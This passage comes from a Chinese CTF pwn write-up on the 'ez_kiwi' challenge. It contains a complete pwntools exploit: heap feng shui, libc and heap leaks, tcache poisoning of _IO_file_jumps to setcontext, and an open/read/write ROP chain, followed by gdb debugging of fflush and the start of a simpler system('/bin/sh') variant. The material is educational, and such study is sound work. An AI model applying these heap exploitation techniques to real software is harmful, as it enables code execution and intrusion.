class="hljs-built_in">int</span>) <span class="hljs-keyword">else</span> <span class="hljs-built_in">breakpoint</span><br>    gdb.attach(p, gdbscript)<br>    time.sleep(<span class="hljs-number">1</span>)<br><br>elf = ELF(<span class="hljs-string">&#x27;./ez_kiwi&#x27;</span>)<br>context(arch = elf.arch, os = <span class="hljs-string">&#x27;linux&#x27;</span>,log_level = <span class="hljs-string">&#x27;debug&#x27;</span>,terminal = [<span class="hljs-string">&#x27;tmux&#x27;</span>, <span class="hljs-string">&#x27;splitw&#x27;</span>, <span class="hljs-string">&#x27;-hp&#x27;</span>,<span class="hljs-string">&#x27;62&#x27;</span>])<br>p = process(<span class="hljs-string">&#x27;./ez_kiwi&#x27;</span>)<br>debug()<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">menu</span>(<span class="hljs-params">choice</span>):<br>    sla(<span class="hljs-string">&#x27;&gt;&gt; &#x27;</span>,<span class="hljs-built_in">str</span>(choice))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">size,<span class="hljs-built_in">id</span>,data=<span class="hljs-string">&#x27;u&#x27;</span></span>):<br>    menu(<span class="hljs-number">1</span>)<br>    sla(<span class="hljs-string">&#x27;How much do you want?&#x27;</span>,<span class="hljs-built_in">str</span>(size))<br>    sla(<span class="hljs-string">&#x27;Which one do you want to put?&#x27;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-built_in">id</span>))<br>    sea(<span class="hljs-string">&#x27;Tell me your idea:\n&#x27;</span>,<span class="hljs-built_in">str</span>(data))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">dele</span>(<span class="hljs-params"><span class="hljs-built_in">id</span></span>):<br>    menu(<span class="hljs-number">2</span>)<br>    sla(<span class="hljs-string">&#x27;Which one do you want to remove?&#x27;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-built_in">id</span>))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params"><span class="hljs-built_in">id</span></span>):<br>    menu(<span class="hljs-number">3</span>)<br>    sla(<span class="hljs-string">&#x27;Which one do you want to look?\n&#x27;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-built_in">id</span>))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params"><span class="hljs-built_in">id</span>,data</span>):<br>    menu(<span class="hljs-number">4</span>)<br>    sla(<span class="hljs-string">&#x27;Which one do you want to change?&#x27;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-built_in">id</span>))<br>    sea(<span class="hljs-string">&#x27;Change your idea:&#x27;</span>,<span class="hljs-built_in">str</span>(data))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">gift</span>():<br>    menu(<span class="hljs-number">666</span>)<br><br><span class="hljs-comment"># flag_addr = heap_base + 0x2a0</span><br>sla(<span class="hljs-string">&#x27;Before the game starts, please give me your name:\n&#x27;</span>,<span class="hljs-string">&#x27;./flag\0&#x27;</span>)<br><br><span class="hljs-comment"># Easy Heap Fengshui</span><br>add(<span class="hljs-number">0x18</span>,<span class="hljs-number">0</span>) <span class="hljs-comment"># 0</span><br>add(<span class="hljs-number">0x18</span>,<span class="hljs-number">1</span>) <span class="hljs-comment"># 1</span><br>add(<span class="hljs-number">0x18</span>,<span class="hljs-number">2</span>) <span class="hljs-comment"># 2</span><br>add(<span class="hljs-number">0x100</span>,<span class="hljs-number">3</span>) <span class="hljs-comment"># 3</span><br>add(<span class="hljs-number">0x100</span>,<span class="hljs-number">4</span>) <span class="hljs-comment"># 4</span><br>add(<span class="hljs-number">0x100</span>,<span class="hljs-number">5</span>) <span class="hljs-comment"># 5</span><br>add(<span class="hljs-number">0x100</span>,<span class="hljs-number">6</span>) <span class="hljs-comment"># 6</span><br>add(<span class="hljs-number">0x18</span>,<span class="hljs-number">7</span>) <span class="hljs-comment"># 7</span><br>add(<span class="hljs-number">0x18</span>,<span class="hljs-number">8</span>) <span class="hljs-comment"># 8</span><br><br><span class="hljs-comment"># chunk1 -&gt; size = 0x40</span><br>edit(<span class="hljs-number">0</span>,<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x18</span>+<span class="hljs-string">&#x27;\x41&#x27;</span>)<br>dele(<span class="hljs-number">1</span>)<br>add(<span class="hljs-number">0x38</span>,<span class="hljs-number">1</span>)<br><br><span class="hljs-comment"># chunk2 -&gt; size = 0x460 Create a unsortedbin</span><br>edit(<span class="hljs-number">1</span>,<span class="hljs-string">&#x27;u&#x27;</span>*<span class="hljs-number">0x18</span> + p64(<span class="hljs-number">0x20</span> + <span class="hljs-number">0x110</span>*<span class="hljs-number">4</span> + <span class="hljs-number">1</span>) + <span class="hljs-string">&#x27;\n&#x27;</span>)<br>dele(<span class="hljs-number">2</span>)<br><br><span class="hljs-comment"># Leak libc</span><br>add(<span class="hljs-number">0x18</span>,<span class="hljs-number">2</span>)<br>show(<span class="hljs-number">2</span>)<br>libc_leak = uu64(ru(<span class="hljs-string">&#x27;\x7f&#x27;</span>,drop=<span class="hljs-literal">False</span>)[-<span class="hljs-number">6</span>:])<br>libc_base = libc_leak - <span class="hljs-number">0x1ebf75</span><br>lg(<span class="hljs-string">&#x27;libc_leak&#x27;</span>,libc_leak)<br>lg(<span class="hljs-string">&#x27;libc_base&#x27;</span>,libc_base)<br>libc = elf.libc<br>libc.address = libc_base<br><br>magic = libc.sym.setcontext + <span class="hljs-number">61</span><br>__sync = libc.sym._IO_file_jumps + <span class="hljs-number">0x60</span><br>_IO_helper_jumps = libc_base + <span class="hljs-number">0x1ec8a0</span><br><br>rax = libc_base + <span class="hljs-number">0x000000000004a550</span><br>rdi = libc_base + <span class="hljs-number">0x0000000000026b72</span><br>rsi = libc_base + <span class="hljs-number">0x0000000000027529</span><br>rdx_r12 = libc_base + <span class="hljs-number">0x000000000011c371</span><br>ret = rdi + <span class="hljs-number">1</span><br>syscall = libc_base + <span class="hljs-number">0x0000000000066229</span><br>read = libc.sym.read<br>write = libc.sym.write<br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">0x000000000004a550 : pop rax ; ret</span><br><span class="hljs-string">0x0000000000026b72 : pop rdi ; ret</span><br><span class="hljs-string">0x000000000011c371 : pop rdx ; pop r12 ; ret</span><br><span class="hljs-string">0x0000000000027529 : pop rsi ; ret</span><br><span class="hljs-string">0x0000000000025679 : ret</span><br><span class="hljs-string">0x0000000000066229: syscall; ret;</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br><span class="hljs-comment"># Leak heap</span><br>dele(<span class="hljs-number">2</span>)<br>add(<span class="hljs-number">0x18</span>,<span class="hljs-number">2</span>,<span class="hljs-string">&#x27;u&#x27;</span>*<span class="hljs-number">0x11</span>)<br>show(<span class="hljs-number">2</span>)<br>ru(<span class="hljs-string">&#x27;u&#x27;</span>*<span class="hljs-number">0x10</span>)<br>heap_leak = uu64(rc(<span class="hljs-number">6</span>))<br>heap_base = (heap_leak&gt;&gt;<span class="hljs-number">12</span>)&lt;&lt;<span class="hljs-number">12</span><br>lg(<span class="hljs-string">&#x27;heap_leak&#x27;</span>,heap_leak)<br>lg(<span class="hljs-string">&#x27;heap_base&#x27;</span>,heap_base)<br>flag_addr = heap_base + <span class="hljs-number">0x2a0</span><br>rop_addr = heap_base + <span class="hljs-number">0x440</span><br><br><span class="hljs-comment"># Prepare ROP</span><br>rop_chain = flat(<br>    <span class="hljs-comment">#   open(&#x27;./flag\0&#x27;)                                                 </span><br>    [rax,<span class="hljs-number">2</span>,rdi,flag_addr,rsi,<span class="hljs-number">0</span>,rdx_r12,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,syscall] + \<br>    <span class="hljs-comment">#   read(new_fd,flag_addr+0x10,0x50)</span><br>    [rdi,<span class="hljs-number">3</span>,rsi,flag_addr+<span class="hljs-number">0x10</span>,rdx_r12,<span class="hljs-number">0x50</span>,<span class="hljs-number">0</span>,read] + \<br>    <span class="hljs-comment">#   write(1,flag_addr+0x10,0x50)</span><br>    [rdi,<span class="hljs-number">1</span>,write] + [<span class="hljs-string">&#x27;\n&#x27;</span>]<br>)<br>edit(<span class="hljs-number">4</span>,rop_chain)<br><br><span class="hljs-comment"># Tcache Poisoning1 _IO_file_jumps -&gt; __sync = setcontext + 61</span><br>dele(<span class="hljs-number">7</span>)<br>dele(<span class="hljs-number">2</span>)<br>edit(<span class="hljs-number">1</span>,<span class="hljs-string">&#x27;u&#x27;</span>*<span class="hljs-number">0x18</span>+p64(<span class="hljs-number">0x21</span>)+p64(__sync) + p64(<span class="hljs-number">0</span>) + <span class="hljs-string">&#x27;\n&#x27;</span>)<br>add(<span class="hljs-number">0x18</span>,<span class="hljs-number">2</span>)<br>add(<span class="hljs-number">0x18</span>,<span class="hljs-number">7</span>,p64(magic))<br><br><span class="hljs-comment"># Tcache Poisoning2 _IO_helper_jumps + 0xA0/0xA8</span><br>dele(<span class="hljs-number">0</span>)<br>dele(<span class="hljs-number">2</span>)<br>edit(<span class="hljs-number">1</span>,<span class="hljs-string">&#x27;u&#x27;</span>*<span class="hljs-number">0x18</span>+p64(<span class="hljs-number">0x21</span>)+p64(_IO_helper_jumps + <span class="hljs-number">0xA0</span>) + p64(<span class="hljs-number">0</span>) + <span class="hljs-string">&#x27;\n&#x27;</span>)<br>add(<span class="hljs-number">0x18</span>,<span class="hljs-number">2</span>)<br>add(<span class="hljs-number">0x18</span>,<span class="hljs-number">0</span>,p64(rop_addr) + p64(ret))<br><br><span class="hljs-comment"># Tcache Poisoning3 topchunk -&gt; size </span><br>dele(<span class="hljs-number">8</span>)<br>dele(<span class="hljs-number">2</span>)<br>edit(<span class="hljs-number">1</span>,<span class="hljs-string">&#x27;u&#x27;</span>*<span class="hljs-number">0x18</span>+p64(<span class="hljs-number">0x21</span>)+p64(heap_base+<span class="hljs-number">0x7a0</span>) + p64(<span class="hljs-number">0</span>) + <span class="hljs-string">&#x27;\n&#x27;</span>)<br>add(<span class="hljs-number">0x18</span>,<span class="hljs-number">2</span>)<br>add(<span class="hljs-number">0x18</span>,<span class="hljs-number">8</span>,p64(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span>)<br><br><span class="hljs-comment"># Trigger kiwi ~~</span><br>pause()<br>gift()<br><br>p.interactive()<br></code></pre></td></tr></table></figure><h6 id="调试-v3"><a class="header-anchor" href="#调试-v3">¶</a>调试</h6><p>简单的 off-by-one 就不提了，主要看一下任意写后咋进入的我们 <strong>kiwi</strong> 流程，又是怎么执行的 <strong>ROP</strong>。</p><p>在 gift() 函数下断点，<code>b malloc</code>。</p><p>当其他条件不满足时来到 sysmalloc 准备从 topchunk 中分配，但由于 topchunk 已经被 👴 🐑 完了，所以会进入 <code>__malloc_assert</code>。</p><img src="https://blog-1310088624.cos.ap-nanjing.myqcloud.com/blog/links/image-20220526164931591.png" alt="image-20220526164931591" style="zoom:67%;" /><p>然后我们的主角 <strong>fflush</strong> 就登场了，这里的 <strong>__fxprintf</strong> 也要眼熟一下( <strong>husk</strong> 会考)：</p><img src="https://blog-1310088624.cos.ap-nanjing.myqcloud.com/blog/links/image-20220526170141182.png" alt="image-20220526170141182" style="zoom:67%;" /><p>这里是重点，我们必须结合汇编代码才能玩明白点：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs asm">pwndbg&gt; x/40i &amp;fflush<br>   0x7ffff7e5a4c0 &lt;fflush&gt;:     endbr64<br>   0x7ffff7e5a4c4 &lt;fflush+4&gt;:   test   rdi,rdi<br>   0x7ffff7e5a4c7 &lt;fflush+7&gt;:   je     0x7ffff7e5a590 &lt;fflush+208&gt;<br>   0x7ffff7e5a4cd &lt;fflush+13&gt;:  push   rbp<br>   0x7ffff7e5a4ce &lt;fflush+14&gt;:  push   rbx<br>   0x7ffff7e5a4cf &lt;fflush+15&gt;:  mov    rbx,rdi<br>   0x7ffff7e5a4d2 &lt;fflush+18&gt;:  sub    rsp,0x8<br>   0x7ffff7e5a4d6 &lt;fflush+22&gt;:  mov    edx,DWORD PTR [rdi]<br>   0x7ffff7e5a4d8 &lt;fflush+24&gt;:  and    edx,0x8000<br>   0x7ffff7e5a4de &lt;fflush+30&gt;:  jne    0x7ffff7e5a51d &lt;fflush+93&gt;<br>   0x7ffff7e5a4e0 &lt;fflush+32&gt;:  mov    rdi,QWORD PTR [rdi+0x88]<br>   0x7ffff7e5a4e7 &lt;fflush+39&gt;:  mov    rbp,QWORD PTR fs:0x10<br>   0x7ffff7e5a4f0 &lt;fflush+48&gt;:  cmp    QWORD PTR [rdi+0x8],rbp<br>   0x7ffff7e5a4f4 &lt;fflush+52&gt;:  je     0x7ffff7e5a519 &lt;fflush+89&gt;<br>   0x7ffff7e5a4f6 &lt;fflush+54&gt;:  mov    eax,DWORD PTR fs:0x18<br>   0x7ffff7e5a4fe &lt;fflush+62&gt;:  test   eax,eax<br>   0x7ffff7e5a500 &lt;fflush+64&gt;:  jne    0x7ffff7e5a5a0 &lt;fflush+224&gt;<br>   0x7ffff7e5a506 &lt;fflush+70&gt;:  mov    edx,0x1<br>   0x7ffff7e5a50b &lt;fflush+75&gt;:  cmpxchg DWORD PTR [rdi],edx<br>   0x7ffff7e5a50e &lt;fflush+78&gt;:  mov    rdi,QWORD PTR [rbx+0x88]<br>   0x7ffff7e5a515 &lt;fflush+85&gt;:  mov    QWORD PTR [rdi+0x8],rbp<br>   0x7ffff7e5a519 &lt;fflush+89&gt;:  add    DWORD PTR [rdi+0x4],0x1<br>   0x7ffff7e5a51d &lt;fflush+93&gt;:  mov    rbp,QWORD PTR [rbx+0xd8]<br>   0x7ffff7e5a524 &lt;fflush+100&gt;: lea    rdx,[rip+0x167375]        # 0x7ffff7fc18a0 &lt;_IO_helper_jumps&gt;<br>   0x7ffff7e5a52b &lt;fflush+107&gt;: lea    rax,[rip+0x1680d6]        # 0x7ffff7fc2608 &lt;__elf_set___libc_atexit_element__IO_cleanup__&gt;<br>   0x7ffff7e5a532 &lt;fflush+114&gt;: sub    rax,rdx<br>   0x7ffff7e5a535 &lt;fflush+117&gt;: mov    rsi,rbp<br>   0x7ffff7e5a538 &lt;fflush+120&gt;: sub    rsi,rdx<br>   0x7ffff7e5a53b &lt;fflush+123&gt;: cmp    rax,rsi<br>   0x7ffff7e5a53e &lt;fflush+126&gt;: jbe    0x7ffff7e5a598 &lt;fflush+216&gt;<br>   0x7ffff7e5a540 &lt;fflush+128&gt;: mov    rdi,rbx<br>=&gt; 0x7ffff7e5a543 &lt;fflush+131&gt;: call   QWORD PTR [rbp+0x60]<br></code></pre></td></tr></table></figure><p>好的，比较关键的几个点：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs asm">0x7ffff7e5a4cf &lt;fflush+15&gt;:  mov    rbx,rdi# rbx = stderr<br>#0x7ffff7e5a50e &lt;fflush+78&gt;:  mov    rdi,QWORD PTR [rbx+0x88] rdi = [stderr + 0x88] = _IO_stdfile_2_lock<br><br>0x7ffff7e5a51d &lt;fflush+93&gt;:  mov    rbp,QWORD PTR [rbx+0xd8] # rbp = [stderr + 0xd8] = _IO_file_jumps<br>0x7ffff7e5a524 &lt;fflush+100&gt;: lea    rdx,[rip+0x167375]        # 0x7ffff7fc18a0 &lt;_IO_helper_jumps&gt;<br>0x7ffff7e5a543 &lt;fflush+131&gt;: call   QWORD PTR [rbp+0x60]# call [_IO_helper_jumps + 0x60] &lt;-&gt; call __sync<br></code></pre></td></tr></table></figure><p>可以发现我们的 <strong>rdx = _IO_helper_jumps</strong>，而高版本的 setcontext 又是由 rdx 控制：</p><img src="https://blog-1310088624.cos.ap-nanjing.myqcloud.com/blog/links/image-20220526174433379.png" alt="image-20220526174433379" style="zoom:67%;" /><p>那么我们在 <code>_IO_helper_jumps + 0xA0</code> 布置的 <code>rsp = rop_chain </code>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">► <span class="hljs-number">0x7ffff7e2d0dd</span> &lt;setcontext+<span class="hljs-number">61</span>&gt;     mov    rsp, qword ptr [rdx + <span class="hljs-number">0xa0</span>]   &lt;<span class="hljs-number">0x7ffff7fc1940</span>&gt;<br></code></pre></td></tr></table></figure><p>在 <code>_IO_helper_jumps + 0xA8</code> 布置的 rcx，也就是被 push 进栈，结束后 ret 取到的 <code>rip = ret</code>：</p><img src="https://blog-1310088624.cos.ap-nanjing.myqcloud.com/blog/links/image-20220526175716709.png" alt="image-20220526175716709" style="zoom:67%;" /> <p>再往下走就到了 ROP 链了，不做过多调试展示：</p><img src="https://blog-1310088624.cos.ap-nanjing.myqcloud.com/blog/links/image-20220526180101385.png" alt="image-20220526180101385" style="zoom:67%;" /><p>最后也是成功地执行了我们的链子，orw 出了 flag。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">[DEBUG] Received 0xdc bytes:<br>    <span class="hljs-string">&quot;ez_kiwi: malloc.c:2379: sysmalloc: Assertion `(old_top == initial_top (av) &amp;&amp; old_size == 0) || ((unsigned long) (old_size) &gt;= MINSIZE &amp;&amp; prev_inuse (old_top) &amp;&amp; ((unsigned long) old_end &amp; (pagesize - 1)) == 0)&#x27; failed.\n&quot;</span><br>ez_kiwi: malloc.c:2379: sysmalloc: Assertion `(old_top == initial_top (av) &amp;&amp; old_size == 0) || ((unsigned long) (old_size) &gt;= MINSIZE &amp;&amp; prev_inuse (old_top) &amp;&amp; ((unsigned long) old_end &amp; (pagesize - 1)) == 0)<span class="hljs-string">&#x27; failed.</span><br><span class="hljs-string">[DEBUG] Received 0x30 bytes:</span><br><span class="hljs-string">    00000000  63 61 66 66  65 31 6e 65  7b 74 65 73  74 5f 66 6c  │caff│e1ne│&#123;tes│t_fl│</span><br><span class="hljs-string">    00000010  61 67 7e 51  77 51 7e 7e  7e 7d 0a 00  00 00 00 00  │ag~Q│wQ~~│~&#125;··│····│</span><br><span class="hljs-string">    00000020  40 65 e6 f7  ff 7f 00 00  10 d0 55 55  55 55 00 00  │@e··│····│··UU│UU··│</span><br><span class="hljs-string">    00000030</span><br><span class="hljs-string">caffe1ne&#123;test_flag~QwQ~~~&#125;</span><br><span class="hljs-string">\x00\x00\x00e\x7f\x00\x10UUUU\x00</span><br></code></pre></td></tr></table></figure><h6 id="没沙箱的简单情形"><a class="header-anchor" href="#没沙箱的简单情形">¶</a>没沙箱的简单情形</h6><p>主要是搞清楚这个利用路线，明白啥时候 🐑 指定的函数指针。</p><p>因为比赛时题目没开沙箱，而且是 <strong>2.31</strong> 版本的 libc，下面是把 <strong>__sync</strong> 直接换成 <code>system</code> 函数，在 stderr 写 <code>/bin/sh\0</code> 的更简单情形。</p><p>这里走 kiwi 🐑 的是 <strong>main_arena -&gt; top</strong> ，就<strong>不需要 leak 堆地址</strong>了。当然 leak 堆地址可以后去劫持 <strong>Tcache Struct</strong> 然后瞎几把 🐑 但是 👴 最近几天玩 Tcache 玩累了就没打了。但如果是 <strong>2.32</strong> 以上版本，由于<a href="https://caffeine.darkflow.top/posts/d6d32804.html">指针异或机制</a>，还是必须要 leak。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python2</span><br><span class="hljs-comment"># -*- coding: utf-8 -*</span><br><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br><br>se      = <span class="hljs-keyword">lambda</span> data               :p.send(data) <br>sa      = <span class="hljs-keyword">lambda</span> delim,data         :p.sendafter(delim, data)<br>sl      = <span class="hljs-keyword">lambda</span> data               :p.sendline(data)<br>sla     = <span class="hljs-keyword">lambda</span> delim,data         :p.sendlineafter(delim, data)<br>sea     = <span class="hljs-keyword">lambda</span> delim,data         :p.sendafter(delim, data)<br>rc      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :p.recv(numb)<br>ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :p.recvuntil(delims, drop)<br>uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>lg = <span class="hljs-keyword">lambda</span> name,data : p.success(name + <span class="hljs-string">&#x27;: \033[1;36m 0x%x \033[0m&#x27;</span> % data)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>(<span class="hljs-params"><span class="hljs-built_in">breakpoint</span>=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>    glibc_dir = <span class="hljs-string">&#x27;~/Exps/Glibc/glibc-2.31/&#x27;</span><br>    gdbscript = <span class="hljs-string">&#x27;directory %smalloc/\n&#x27;</span> % glibc_dir<br>    gdbscript += <span class="hljs-string">&#x27;directory %sstdio-common/\n&#x27;</span> % glibc_dir<br>    gdbscript += <span class="hljs-string">&#x27;directory %sstdlib/\n&#x27;</span> % glibc_dir<br>    gdbscript += <span class="hljs-string">&#x27;directory %slibio/\n&#x27;</span> % glibc_dir<br>    elf_base = <span class="hljs-built_in">int</span>(os.popen(<span class="hljs-string">&#x27;pmap &#123;&#125;| awk \x27&#123;&#123;print \x241&#125;&#125;\x27&#x27;</span>.<span class="hljs-built_in">format</span>(p.pid)).readlines()[<span class="hljs-number">1</span>], <span class="hljs-number">16</span>) <span class="hljs-keyword">if</span> elf.pie <span class="hljs-keyword">else</span> <span class="hljs-number">0</span><br>    gdbscript += <span class="hljs-string">&#x27;b *&#123;:#x&#125;\n&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">int</span>(<span class="hljs-built_in">breakpoint</span>) + elf_base) <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(<span class="hljs-built_in">breakpoint</span>, <span class="hljs-built_in">int</span>) <span class="hljs-keyword">else</span> <span class="hljs-built_in">breakpoint</span><br>    gdb.attach(p, gdbscript)<br>    time.sleep(<span class="hljs-number">1</span>)<br><br>elf = ELF(<span class="hljs-string">&#x27;./ez_kiwi&#x27;</span>)<br>context(arch = elf.arch, os = <span class="hljs-string">&#x27;linux&#x27;</span>,log_level = <span class="hljs-string">&#x27;debug&#x27;</span>,terminal = [<span class="hljs-string">&#x27;tmux&#x27;</span>, <span class="hljs-string">&#x27;splitw&#x27;</span>, <span class="hljs-string">&#x27;-hp&#x27;</span>,<span class="hljs-string">&#x27;62&#x27;</span>])<br>p = process(<span class="hljs-string">&#x27;./ez_kiwi&#x27;</span>)<br>debug()<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">menu</span>(<span class="hljs-params">choice</span>):<br>    sla(<span class="hljs-string">&#x27;&gt;&gt; &#x27;</span>,<span class="hljs-built_in">str</span>(choice))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">size,<span class="hljs-built_in">id</span>,data=<span class="hljs-string">&#x27;u&#x27;</span></span>):<br>    menu(<span class="hljs-number">1</span>)<br>    sla(<span class="hljs-string">&#x27;How much do you want?&#x27;</span>,<span class="hljs-built_in">str</span>(size))<br>    sla(<span class="hljs-string">&#x27;Which one do you want to put?&#x27;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-built_in">id</span>))<br>    sea(<span class="hljs-string">&#x27;Tell me your idea:\n&#x27;</span>,<span class="hljs-built_in">str</span>(data))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">dele</span>(<span class="hljs-params"><span class="hljs-built_in">id</span></span>):<br>    menu(<span class="hljs-number">2</span>)<br>    sla(<span class="hljs-string">&#x27;Which one do you want to remove?&#x27;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-built_in">id</span>))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params"><span class="hljs-built_in">id</span></span>):<br>    menu(<span class="hljs-number">3</span>)<br>    sla(<span class="hljs-string">&#x27;Which one do you want to look?\n&#x27;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-built_in">id</span>))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params"><span class="hljs-built_in">id</span>,data</span>):<br>    menu(<span class="hljs-number">4</span>)<br>    sla(<span class="hljs-string">&#x27;Which one do you want to change?&#x27;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-built_in">id</span>))<br>    sea(<span class="hljs-string">&#x27;Change your idea:&#x27;</span>,<span class="hljs-built_in">str</span>(data))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">gift</span>():<br>    menu(<span class="hljs-number">666</span>)<br><br><span class="hljs-comment"># flag_addr = heap_base + 0x2a0</span><br>sla(<span class="hljs-string">&#x27;Before the game starts, please give me your name:\n&#x27;</span>,<span class="hljs-string">&#x27;./flag\0&#x27;</span>)<br><br><span class="hljs-comment"># Easy Heap Fengshui</span><br>add(<span class="hljs-number">0x18</span>,<span class="hljs-number">0</span>) <span class="hljs-comment"># 0</span><br>add(<span class="hljs-number">0x18</span>,<span class="hljs-number">1</span>) <span class="hljs-comment"># 1</span><br>add(<span class="hljs-number">0x18</span>,<span class="hljs-number">2</span>) <span class="hljs-comment"># 2</span><br>add(<span class="hljs-number">0x100</span>,<span class="hljs-number">3</span>) <span class="hljs-comment"># 3</span><br>add(<span class="hljs-number">0x100</span>,<span class="hljs-number">4</span>) <span class="hljs-comment"># 4</span><br>add(<span class="hljs-number">0x100</span>,<span class="hljs-number">5</span>) <span class="hljs-comment"># 5</span><br>add(<span class="hljs-number">0x100</span>,<span class="hljs-number">6</span>) <span class="hljs-comment"># 6</span><br>add(<span class="hljs-number">0x18</span>,<span class="hljs-number">7</span>) <span 